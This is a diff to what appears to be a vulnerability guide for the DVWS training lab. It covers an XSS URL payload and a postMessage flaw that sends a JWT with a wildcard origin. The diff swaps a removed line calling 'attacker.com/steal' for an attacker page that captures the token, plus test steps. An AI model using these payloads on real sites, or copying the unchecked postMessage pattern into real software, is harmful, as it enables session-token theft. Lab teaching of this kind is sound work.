@@ -54,21 +54,25 @@ Navigate to: /dashboard#<img src=x onerror=alert(1)>
 **Vulnerability:**
 ```typescript
 window.addEventListener('message', (event) => {
-  // NO ORIGIN CHECK - accepts from ANY domain
-  receivedMessage = event.data;
+  // The viewer decodes the message, but does not validate event.origin.
+  decoded = decodeToken(event.data);
 });
 
-// Sends JWT with wildcard origin
-iframe?.contentWindow?.postMessage(token, '*');
+// Sends JWT to an embedded parent or opener with a wildcard target origin
+window.parent.postMessage(token, '*');
 ```
 
 **Test:**
 Create attacker page:
 ```html
-<iframe src="https://dvws.local/admin"></iframe>
 <script>
-  frames[0].postMessage('<img src=//attacker.com/steal>', '*');
+  window.addEventListener('message', (event) => {
+    if (typeof event.data === 'string') {
+      console.log('stolen JWT:', event.data);
+    }
+  });
 </script>
+<iframe src="https://dvws.local/admin"></iframe>
 ```
 
 ---
@@ -286,9 +290,9 @@ All backend vulnerabilities remain intact as the API was not modified:
    - Submit while logged into DVWS
 
 3. **PostMessage Test:**
-   - Open admin panel
-   - Open browser console
-   - Check JWT token displayed via postMessage
+   - Create an attacker page that embeds `/admin` in an iframe
+   - Listen for `message` events in the attacker page
+   - Decode the captured JWT and inspect its claims
 
 4. **SOAP Injection Test:**
    - Go to Admin > User Status
